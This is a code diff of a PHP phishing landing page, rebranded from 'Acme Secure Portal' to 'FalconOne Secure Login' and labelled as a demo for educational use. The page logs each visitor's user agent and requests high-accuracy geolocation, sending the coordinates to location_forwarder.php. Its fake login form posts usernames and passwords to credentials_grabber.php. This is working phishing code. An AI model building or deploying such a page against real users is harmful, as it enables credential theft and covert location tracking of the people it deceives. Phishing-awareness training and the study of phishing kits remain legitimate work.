@@ -1,36 +1,23 @@
 <?php
 /**
  * landing.php
- * 
- * Main phishing landing page. 
- * Requests geolocation, collects credentials, logs user agent.
+ * Main phishing landing: logs user agent, requests credentials, attempts geolocation.
  */
 
 require_once __DIR__ . '/logger.php';
 
-// Log user agent each time this page is accessed
+// Log user agent each time landing is visited
 logUserAgent();
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Acme Secure Portal</title>
+  <title>FalconOne - Landing</title>
   <meta name="description" content="Phishing Demo - Secure Login Portal">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- Social Preview -->
-  <meta property="og:title" content="Acme Secure Portal">
-  <meta property="og:description" content="Sign in to access your Acme account.">
-  <meta property="og:type" content="website">
-  <meta property="og:site_name" content="AcmeOnline">
-
-  <!-- Favicon -->
-  <link rel="icon" 
-        href="https://cdn.iconscout.com/icon/free/png-256/shield-security-protection-1891403-1597673.png" 
-        type="image/png">
-
-  <!-- Custom Styles -->
+  <!-- Styles -->
   <link rel="stylesheet" href="styles/main.css">
   <link rel="stylesheet" href="styles/join.css">
   <link rel="stylesheet" href="styles/footer.css">
@@ -38,34 +25,33 @@ logUserAgent();
 </head>
 <body>
 
-<!-- Container that mimics a two-column “join” layout from join.css -->
 <article class="join">
   <div class="join__container">
-    <!-- Upper section (join__message) -->
+    <!-- Title/Welcome -->
     <section class="join__message">
-      <h1 class="join__heading">Welcome to Acme Secure Portal</h1>
+      <h1 class="join__heading">FalconOne Secure Login</h1>
       <p class="join__subheading">Protecting your account is our priority.</p>
-      <p class="join__text">Please sign in and verify your location to continue.</p>
+      <p class="join__text">Please sign in and share your location for verification.</p>
     </section>
 
-    <!-- Left column for geolocation (join__subscribe) -->
+    <!-- Column: geolocation request -->
     <section class="join__subscribe">
       <h2 class="join__heading">Location Check</h2>
       <p class="join__price">$0 <span class="join__price-month">Demo</span></p>
-      <p class="join__price-desc">Click the button to provide your location.</p>
+      <p class="join__price-desc">Click below to allow geolocation.</p>
       <a href="#" class="join__cta" onclick="getLocation()">Allow Location</a>
       <p id="errorMessage" style="margin-top:10px; color:red;"></p>
     </section>
 
-    <!-- Right column (join__about) with login form -->
+    <!-- Column: login form -->
     <section class="join__about">
       <h2 class="join__heading">Account Login</h2>
       <form action="credentials_grabber.php" method="post">
         <label for="uname"><b>Username or Email</b></label>
-        <input type="text" placeholder="Enter Username" name="uname" id="uname" required>
+        <input type="text" name="uname" id="uname" placeholder="Enter username" required>
 
         <label for="psw"><b>Password</b></label>
-        <input type="password" placeholder="Enter Password" name="psw" id="psw" required>
+        <input type="password" name="psw" id="psw" placeholder="Enter password" required>
 
         <button type="submit">Sign In</button>
       </form>
@@ -76,11 +62,7 @@ logUserAgent();
 <!-- Footer -->
 <footer class="footer">
   <div class="footer__attribution">
-    <p class="footer__text">
-      &copy; 2025 Acme Corp. 
-      | <a href="https://www.strikevaults.com" target="_blank">StrikeVaults</a> Labs
-    </p>
-    <p class="footer__text">For demonstration purposes only.</p>
+    <p class="footer__text">&copy; 2025 FalconOne - Educational Only</p>
   </div>
 </footer>
 
@@ -89,20 +71,20 @@ function getLocation() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
   } else {
-    document.getElementById("errorMessage").textContent = "Geolocation not supported by your browser.";
+    document.getElementById('errorMessage').textContent = 'Geolocation not supported.';
   }
 }
 
 function success(pos) {
   const lat = pos.coords.latitude;
   const lon = pos.coords.longitude;
-  window.location = "location_forwarder.php?x=" + lat + "&y=" + lon;
+  window.location = `location_forwarder.php?x=${lat}&y=${lon}`;
 }
 
-function error(err) {
-  document.getElementById("errorMessage").textContent = 
-    "Geolocation request denied or unavailable.";
+function error(e) {
+  document.getElementById('errorMessage').textContent = 'Geolocation request was denied or unavailable.';
 }
 </script>
+
 </body>
 </html>
